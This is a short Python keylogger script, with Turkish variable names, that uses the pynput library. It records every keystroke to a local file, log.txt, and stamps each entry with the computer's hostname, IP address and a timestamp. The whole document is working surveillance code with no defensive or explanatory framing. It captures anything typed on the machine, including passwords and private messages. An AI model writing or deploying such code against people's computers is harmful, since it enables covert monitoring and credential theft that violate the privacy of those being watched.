from pynput.keyboard import Key,Listener
import datetime
import socket

bilgisayar_Adi = socket.gethostname()
bilgisayarIp = socket.gethostbyname(bilgisayar_Adi)
timer = datetime.datetime.now()
device = "Tarih: {}\nBilgisayar Adı:{}\nIP: {}\n".format(timer,bilgisayar_Adi,bilgisayarIp)



def on_press(key):
    with open('log.txt','a') as file:
        data = str(device)+" "+str(key)
        file.write(data)


    print(key)
    #logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
